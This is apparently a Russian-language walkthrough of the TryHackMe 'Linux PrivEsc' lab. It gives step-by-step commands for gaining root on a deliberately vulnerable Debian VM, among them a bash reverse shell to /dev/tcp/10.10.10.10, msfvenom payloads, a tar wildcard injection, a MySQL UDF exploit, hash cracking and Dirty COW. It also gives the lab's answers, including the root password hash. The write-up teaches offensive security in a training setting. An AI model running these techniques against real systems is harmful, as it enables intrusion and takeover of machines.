[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc) 

Всего 21 заданиe:
## Задание 1
Цель этой комнаты — провести вас через различные методы повышения привилегий в Linux. Для этого вам необходимо 
сначала развернуть намеренно уязвимую виртуальную машину Debian. Эта виртуальная машина была создана Саги Шахаром в 
рамках его локального семинара по повышению привилегий,  но была обновлена Tib3rius в рамках его курса Linux 
Privilege Escalation for OSCP and Beyond! на Udemy. Полные объяснения различных методов, используемых в этой комнате,
доступны там же, вместе с демонстрациями и советами по поиску повышений привилегий в Linux.

Прежде чем пытаться получить доступ к виртуальной машине Debian , убедитесь, что вы подключены к TryHackMe VPN  или 
используете браузерный экземпляр Kali!

SSH должен быть доступен на порту 22. Вы можете войти в учетную запись «user», используя следующую команду:
`ssh user@MACHINE_IP`
Если вы видите следующее сообщение: «Вы уверены, что хотите продолжить подключение (да/нет)?» введите yes  и нажмите 
Enter.

Пароль для учетной записи «пользователь» — «password321».

Примечание: Если вы получаете сообщение об ошибке, говорящее о том, что OpenSSH устарел ssh-rsa. Добавьте к вашей 
команде для подключения. `Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: 
ssh-rsa, ssh-dss-oHostKeyAlgorithms=+ssh-rsa`

Следующие задачи проведут вас через различные методы повышения привилегий. После каждого метода у вас должна быть 
оболочка root. Не забудьте выйти из оболочки и/или заново установить сеанс в качестве учетной записи "пользователя" 
перед началом следующей задачи!  

### Ответьте на вопросы ниже
Разверните машину и войдите в учетную запись «пользователя» с помощью SSH.
```commandline
Ответ не нужен
```
Запустите команду "id". Какой результат?
```commandline
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Задание 2
Служба MySQL запущена как root, а пользователю "root" для службы не назначен пароль. Мы можем использовать 
популярный эксплойт , который использует пользовательские функции (UDF) для запуска системных команд как root через 
службу MySQL.

Перейдите в каталог `/home/user/tools/mysql-udf`:
```commandline
cd /home/user/tools/mysql-udf
```
Скомпилируйте код эксплойта raptor_udf2.c, используя следующие команды:
```commandline
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Подключитесь к службе MySQL как пользователь root с пустым паролем:
```commandline
mysql -u root
```
Выполните следующие команды в оболочке MySQL, чтобы создать пользовательскую функцию (UDF) «do_system» с помощью 
нашего скомпилированного эксплойта:
```commandline
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Используйте функцию для копирования /bin/bash в /tmp/rootbash и установки разрешения SUID:
```commandline
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Выйдите из оболочки MySQL (введите exit  или \q  и нажмите Enter ) и запустите исполняемый файл /tmp/rootbash с 
параметром -p, чтобы запустить оболочку с привилегиями root:
```commandline
/tmp/rootbash -p
```
Не забудьте удалить исполняемый файл `/tmp/rootbash` и выйти из оболочки root, прежде чем продолжить, так как позже 
вы снова создадите этот файл в этой же комнате!
```commandline
rm /tmp/rootbash
exit
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 3
Файл /etc/shadow содержит хэши паролей пользователей и обычно доступен для чтения только пользователю root.

Обратите внимание, что файл `/etc/shadow` на виртуальной машине доступен для чтения всем:
```commandline
ls -l /etc/shadow
```
Просмотрите содержимое файла `/etc/shadow`:
```commandline
cat /etc/shadow
```
Каждая строка файла представляет пользователя. Хэш пароля пользователя (если он есть) можно найти между первым и 
вторым двоеточием (:) каждой строки. 

Сохраните хэш пользователя root в файле hash.txt на вашей виртуальной машине Kali и используйте john the ripper, 
чтобы взломать его. Возможно, вам придется сначала распаковать `/usr/share/wordlists/rockyou.txt.gz` и запустить 
команду с помощью sudo в зависимости от вашей версии Kali:
```commandline
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Переключитесь на пользователя root, используя взломанный пароль:
```commandline
su root
```

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Каков хеш пароля пользователя root?
```commandline
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```
Какой алгоритм хеширования использовался для создания хеша пароля пользователя root?
```commandline
sha512crypt
```
Какой пароль у пользователя root?
```commandline
password123
```

## Задание 4
Файл `/etc/shadow` содержит хэши паролей пользователей и обычно доступен для чтения только пользователю root.
Обратите внимание, что файл /etc/shadow на виртуальной машине доступен для записи всем:
```commandline
ls -l /etc/shadow
```
Создайте новый хеш пароля с паролем по вашему выбору:
```commandline
mkpasswd -m sha-512 newpasswordhere
```
Отредактируйте файл `/etc/shadow` и замените исходный хеш пароля пользователя root на тот, который вы только что 
сгенерировали.
Переключитесь на пользователя root, используя новый пароль:
```commandline
su root
```
Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 5
Файл `/etc/passwd` содержит информацию об учетных записях пользователей. Он доступен для чтения всем, но обычно 
доступен для записи только пользователю root. Исторически файл `/etc/passwd` содержал хэши паролей пользователей, и 
некоторые версии Linux по -прежнему позволяют хранить там хэши паролей.

Обратите внимание, что файл `/etc/passwd` доступен для записи всем:
```commandline
ls -l /etc/passwd
```
Создайте новый хеш пароля с паролем по вашему выбору:
```commandline
openssl passwd newpasswordhere
```
Отредактируйте файл `/etc/passwd` и поместите сгенерированный хеш пароля между первым и вторым двоеточием (:) строки 
пользователя root (заменив «x»).
Переключитесь на пользователя root, используя новый пароль:
```commandline
su root
```
Либо скопируйте строку пользователя root и добавьте ее в конец файла, изменив первое вхождение слова «root» на 
«newroot» и поместив сгенерированный хеш пароля  между первым и вторым двоеточием (заменив «x»).

Теперь переключитесь на пользователя newroot, используя новый пароль:
```commandline
su newroot
```
Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Запустите команду "id" как пользователь newroot. Какой результат?
```commandline
uid=0(root) gid=0(root) groups=0(root)
```

## Задание 6
Перечислите программы, которые sudo позволяет запускать вашему пользователю:
```commandline
sudo -l
```
Посетите GTFOBins ( https://gtfobins.github.io ) и найдите некоторые названия программ. Если программа указана с 
"sudo" как функцией, вы можете использовать ее для повышения привилегий, обычно с помощью escape-последовательности.

Выберите программу из списка и попробуйте получить root-доступ, следуя инструкциям от GTFOBins.

Для дополнительной сложности попробуйте получить права root, используя все программы из списка!

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Сколько программ «пользователю» разрешено запускать через sudo? 
```commandline
11
```
У одной программы из списка нет последовательности выхода из оболочки на GTFOBins. Какая из них?
```commandline
apache2
```
Подумайте, как можно использовать эту программу с sudo для получения привилегий root без escape-последовательности 
оболочки. 
```commandline
Ответ не нужен
```

## Задание 7
Sudo можно настроить на наследование определенных переменных среды из среды пользователя.

Проверьте, какие переменные среды унаследованы (найдите параметры env_keep):
```commandline
sudo -l
```
LD_PRELOAD и LD_LIBRARY_PATH оба наследуются из среды пользователя.  LD_PRELOAD загружает общий объект перед любыми 
другими при запуске программы. LD_LIBRARY_PATH предоставляет список каталогов, в которых в первую очередь ищутся 
общие библиотеки.

Создайте общий объект, используя код, расположенный в `/home/user/tools/sudo/preload.c` :
```commandline
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Запустите одну из программ, которые вам разрешено запускать через sudo (перечисленных при запуске sudo -l ), 
установив переменную среды LD_PRELOAD на полный путь к новому общему объекту:
```commandline
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Должна появиться оболочка root. Выйдите из оболочки перед продолжением. В зависимости от выбранной вами программы 
вам может потребоваться выйти и из нее.

Запустите ldd для файла программы apache2, чтобы увидеть, какие общие библиотеки используются программой:
```commandline
ldd /usr/sbin/apache2
```
Создайте общий объект с тем же именем, что и у одной из перечисленных библиотек (libcrypt.so.1), используя код, 
расположенный в `/home/user/tools/sudo/library_path.c`:
```commandline
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Запустите apache2 с помощью sudo, установив переменную среды LD_LIBRARY_PATH на /tmp (куда мы выводим 
скомпилированный общий объект):
```commandline
sudo LD_LIBRARY_PATH=/tmp apache2
```
Должна появиться оболочка root. Выйдите из оболочки. Попробуйте переименовать `/tmp/libcrypt.so.1` в имя другой 
библиотеки, используемой apache2, и снова запустить apache2 с помощью sudo. Сработало? Если нет, попробуйте выяснить,
почему и как  можно изменить код library_path.c, чтобы это сработало.

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 8
Задания Cron — это программы или скрипты, запуск которых пользователи могут запланировать на определенное время или 
интервалы. Файлы таблиц Cron (crontab) хранят конфигурацию заданий cron.  Системный crontab находится в `/etc/crontab`.

Просмотр содержимого общесистемного crontab:
```commandline
cat /etc/crontab
```
Должно быть запланировано два задания cron, которые будут запускаться каждую минуту. Одно запускает overwrite.sh, 
другое запускает `/usr/local/bin/compress.sh`.

Найдите полный путь к файлу overwrite.sh:
```commandline
locate overwrite.sh
```

Обратите внимание, что файл доступен для записи всем пользователям:
```commandline
ls -l /usr/local/bin/overwrite.sh
```
Замените содержимое файла `overwrite.sh` следующим, предварительно изменив IP-адрес на адрес вашего компьютера Kali.
```commandline
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
Настройте прослушиватель netcat на вашем Kali box на порту 4444 и дождитесь выполнения задания cron (это не должно 
занять больше минуты). Корневая оболочка должна подключиться к вашему прослушивателю netcat. Если он не 
перепроверяет разрешения файла, чего-то не хватает?
```commandline
nc -nvlp 4444
```
Не забудьте выйти из оболочки root и удалить код обратной оболочки, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 9
Просмотр содержимого общесистемного crontab:
```commandline
cat /etc/crontab
```
Обратите внимание, что переменная PATH начинается с  `/home/user`, что является домашним каталогом нашего пользователя.
Создайте в домашнем каталоге файл с именем `overwrite.sh` со следующим содержимым:
```commandline
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
Убедитесь, что файл является исполняемым:
```commandline
chmod +x /home/user/overwrite.sh
```
Подождите, пока запустится задание cron (это не должно занять больше минуты).  Запустите команду `/tmp/rootbash с -p`, 
чтобы запустить оболочку с привилегиями root:
```commandline
/tmp/rootbash -p
```
Не забудьте удалить измененный код, удалить исполняемый файл `/tmp/rootbash` и выйти из оболочки с повышенными 
привилегиями, прежде чем продолжить, так как позже вы снова создадите этот файл в этой же комнате!
```commandline
rm /tmp/rootbash
exit
```

### Ответьте на вопросы ниже
Каково значение переменной PATH в /etc/crontab?
```commandline
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

## Задание 10
Посмотрите содержимое другого скрипта задания cron:
```commandline
cat /usr/local/bin/compress.sh
```
Обратите внимание, что команда tar запускается с подстановочным знаком (*) в вашем домашнем каталоге.
Взгляните на страницу GTFOBins для tar. Обратите внимание, что tar имеет параметры командной строки, которые 
позволяют вам запускать другие команды как часть функции контрольной точки.
Используйте `msfvenom` на вашем Kali box для генерации обратного бинарного файла ELF. Обновите IP-адрес LHOST 
соответствующим образом:
```commandline
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Перенесите файл shell.elf в /home/user/ на виртуальной машине Debian (вы можете использовать scp  или разместить 
файл на веб-сервере на вашем компьютере с Kali и использовать wget ). Убедитесь, что файл является исполняемым:
```commandline
chmod +x /home/user/shell.elf
```
Создайте эти два файла в /home/user:
```commandline
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
При запуске команды tar в задании cron подстановочный знак (*) будет расширен, чтобы включить эти файлы. Поскольку 
их имена файлов являются допустимыми параметрами командной строки tar, tar распознает их как таковые и будет 
рассматривать их как параметры командной строки, а не имена файлов.

Настройте прослушиватель netcat на вашем Kali box на порту 4444 и дождитесь выполнения задания cron (это не должно 
занять больше минуты). Оболочка root должна подключиться к вашему прослушивателю netcat.
```commandline
nc -nvlp 4444
```

Не забудьте выйти из оболочки root и удалить все созданные вами файлы, чтобы предотвратить повторное выполнение задания cron:
```commandline
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 11
Найдите все исполняемые файлы SUID/SGID на виртуальной машине Debian :
```commandline
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Обратите внимание, что в результатах отображается `/usr/sbin/exim-4.84-3`. Попробуйте найти известный эксплойт для 
этой версии exim.  Exploit-DB , Google и GitHub — хорошие места для поиска! 

Должен быть доступен локальный эксплойт повышения привилегий, точно соответствующий этой версии exim. Копию можно 
найти на виртуальной машине Debian в  `/home/user/tools/suid/exim/cve-2016-1531.sh` . 

Запустите скрипт эксплойта, чтобы получить root-оболочку:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 12
Исполняемый файл  SUID `/usr/local/bin/suid-so` уязвим для внедрения общих объектов.

Сначала запустите файл и обратите внимание, что в настоящее время перед выходом отображается индикатор выполнения:

`/usr/local/bin/suid-so`

Запустите strace для файла и найдите в выходных данных вызовы открытия/доступа, а также ошибки «такой файл отсутствует»:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Обратите внимание, что исполняемый файл пытается загрузить общий объект `/home/user/.config/libcalc.so` в нашем 
домашнем каталоге, но не может его найти.

Создайте каталог .config для файла libcalc.so:

`mkdir /home/user/.config`

Пример кода общего объекта можно найти в /home/user/tools/suid/libcalc.c . Он просто порождает оболочку Bash. 
Скомпилируйте код в общий объект в том месте, где его искал исполняемый файл suid-so:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Запустите исполняемый файл suid-so еще раз и обратите внимание, что на этот раз вместо индикатора выполнения мы 
получаем оболочку root.

`/usr/local/bin/suid-so`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 13
Уязвимость может быть вызвана использованием исполняемого файла `/usr/local/bin/suid-env`, поскольку он наследует 
переменную среды PATH пользователя и пытается выполнить программы без указания абсолютного пути. 

Сначала запустите файл и обратите внимание, что он, по-видимому, пытается запустить веб-сервер apache2:

`/usr/local/bin/suid-env`

Запустите strings для файла, чтобы найти строки печатных символов:

`strings /usr/local/bin/suid-env`

Одна строка («service apache2 start») предполагает, что исполняемый файл службы вызывается для запуска веб-сервера, 
однако полный путь к исполняемому файлу (/usr/sbin/service) не используется. 

Скомпилируйте код, расположенный в  /home/user/tools/suid/service.c , в исполняемый файл с именем service . Этот код 
просто порождает оболочку Bash: 

`gcc -o service /home/user/tools/suid/service.c`

Добавьте текущий каталог (или каталог, в котором расположен новый исполняемый файл службы) в переменную PATH и 
запустите  исполняемый файл suid-env, чтобы получить root-оболочку: 

`PATH=.:$PATH /usr/local/bin/suid-env`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 14
Исполняемый файл  /usr/local/bin/suid-env2  идентичен  /usr/local/bin/suid-env,  за исключением того, что он  
использует абсолютный путь исполняемого файла службы ( /usr/sbin/service) для запуска веб-сервера apache2. 

Проверьте это с помощью строк:

`strings /usr/local/bin/suid-env2`

В версиях Bash  <4.2-048 можно определять функции оболочки с именами, напоминающими пути к файлам, а затем 
экспортировать эти функции так, чтобы они использовались вместо любого фактического исполняемого файла по этому пути 
к файлу.  

Убедитесь, что версия Bash, установленная на виртуальной машине Debian , ниже 4.2-048:

`/bin/bash --version`

Создайте функцию Bash с именем « /usr/sbin/service », которая запускает новую оболочку Bash (используя -p, чтобы 
сохранить разрешения), и экспортируйте функцию: 
```commandline
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Запустите исполняемый файл suid-env2, чтобы получить root-оболочку:
`/usr/local/bin/suid-env2`
Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 15
Примечание: это не будет работать в Bash версии 4.4 и выше.

В режиме отладки Bash использует переменную окружения PS4 для отображения дополнительного приглашения для отладочных 
операторов. 

Запустите исполняемый файл /usr/local/bin/suid-env2 с включенной отладкой bash и переменной PS4, заданной для 
встроенной команды, которая создает SUID-версию /bin/bash: 

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Запустите исполняемый файл /tmp/rootbash с параметром -p, чтобы запустить оболочку с привилегиями root:

`/tmp/rootbash -p`

Не забудьте удалить исполняемый файл /tmp/rootbash и выйти из оболочки с повышенными привилегиями, прежде чем 
продолжить, так как позже вы снова создадите этот файл в этой же комнате! 
```commandline
rm /tmp/rootbash
exit
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 16
Если пользователь случайно введет свой пароль в командной строке, а не в поле запроса пароля, это может быть 
записано в файле истории. 

Просмотр содержимого всех скрытых файлов истории в домашнем каталоге пользователя:

`cat ~/.*history | less`

Обратите внимание, что пользователь пытался подключиться к серверу MySQL в какой-то момент, используя имя 
пользователя "root" и пароль, отправленный через командную строку. Обратите внимание, что между опцией -p и паролем 
нет пробела!  

Переключитесь на пользователя root, используя пароль:

`su root`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Какую полную команду MySQL выполнил пользователь?
```commandline
mysql -h somehost.local -uroot -ppassword123
```

## Задание 17
Файлы конфигурации часто содержат пароли в открытом виде или в других обратимых форматах.

Вывести список содержимого домашнего каталога пользователя:

`ls /home/user`

Обратите внимание на наличие  файла конфигурации myvpn.ovpn. Посмотрите содержимое файла:

`cat /home/user/myvpn.ovpn`

Файл должен содержать ссылку на другое место, где можно найти учетные данные пользователя root. Переключитесь на 
пользователя root, используя учетные данные: 

`su root`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
В каком файле вы нашли учетные данные пользователя root?   
```commandline
/etc/openvpn/auth.txt
```

## Задание 18
Иногда пользователи создают резервные копии важных файлов, но не обеспечивают их безопасность с помощью правильных 
разрешений. 

Найдите скрытые файлы и каталоги в корне системы:

`ls -la /`

Обратите внимание, что, похоже, есть скрытый каталог с именем .ssh . Посмотрите содержимое каталога:

`ls -l /.ssh`

Обратите внимание, что есть файл root_key , доступный для чтения всем . Дальнейшее изучение этого файла должно 
показать, что это закрытый ключ SSH. Название файла предполагает, что он предназначен для пользователя root. 

Скопируйте ключ на свой компьютер с Kali (проще просто просмотреть содержимое файла root_key  и скопировать/вставить 
ключ) и предоставьте ему правильные разрешения, иначе ваш SSH- клиент откажется его использовать: 

`chmod 600 root_key`

Используйте ключ для входа в виртуальную машину Debian в качестве учетной записи root (обратите внимание, что из-за 
возраста устройства при использовании SSH требуются некоторые дополнительные настройки ): 

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 19
Файлы, созданные через NFS, наследуют идентификатор удаленного  пользователя. Если пользователь — root, и включено 
сжатие root, идентификатор будет установлен на пользователя «nobody». 

Проверьте конфигурацию общего ресурса NFS на виртуальной машине Debian :

`cat /etc/exports`

Обратите внимание, что для общего ресурса /tmp отключено сжатие root.

На вашем компьютере с Kali переключитесь на пользователя root, если вы еще не работаете как root:

`sudo su`

Используя пользователя root в Kali, создайте точку монтирования на вашем компьютере с Kali и смонтируйте общий 
ресурс /tmp (соответственно обновите IP-адрес) : 
```commandline
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

Все еще используя пользователя root в Kali, сгенерируйте полезную нагрузку с помощью msfvenom и сохраните ее в 
смонтированном общем ресурсе (эта полезная нагрузка просто вызывает /bin/bash): 

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Продолжая использовать пользователя root в Kali, сделайте файл исполняемым и установите разрешение SUID:

`chmod +xs /tmp/nfs/shell.elf`

Вернитесь на виртуальную машину Debian , как учетная запись пользователя с низкими привилегиями, выполните файл, чтобы получить root-оболочку:

`/tmp/shell.elf`

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Как называется опция, отключающая сжатие корней?
```commandline
no_root_squash
```

## Задание 20
Эксплойты ядра могут привести систему в нестабильное состояние, поэтому их следует запускать только в крайнем случае.

Запустите инструмент Linux Exploit Suggester 2 для выявления потенциальных уязвимостей ядра в текущей системе:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

Популярный эксплойт ядра Linux "Dirty COW" должен быть указан. Код эксплойта для Dirty COW можно найти в  
`/home/user/tools/kernel-exploits/dirtycow/c0w.c` . Он заменяет файл SUID `/usr/bin/passwd` на тот, который 
порождает оболочку (резервная копия `/usr/bin/passwd` делается в `/tmp/bak`).  

Скомпилируйте код и запустите его (обратите внимание, что выполнение может занять несколько минут):
```commandline
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```
После завершения работы эксплойта запустите /usr/bin/passwd, чтобы получить root-оболочку:

`/usr/bin/passwd`

Не забудьте восстановить исходный файл /usr/bin/passwd и выйти из оболочки root перед продолжением!
```commandline
mv /tmp/bak /usr/bin/passwd
exit
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```


## Задание 21
Было написано несколько инструментов, которые помогают обнаружить потенциальные повышения привилегий в Linux. Три 
из этих инструментов были включены в Debian VM в следующем каталоге:  `/home/user/tools/privesc-scripts` 

### Ответьте на вопросы ниже
Поэкспериментируйте со всеми тремя инструментами, запуская их с разными опциями. Все ли из них идентифицируют методы,
используемые в этой комнате?
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)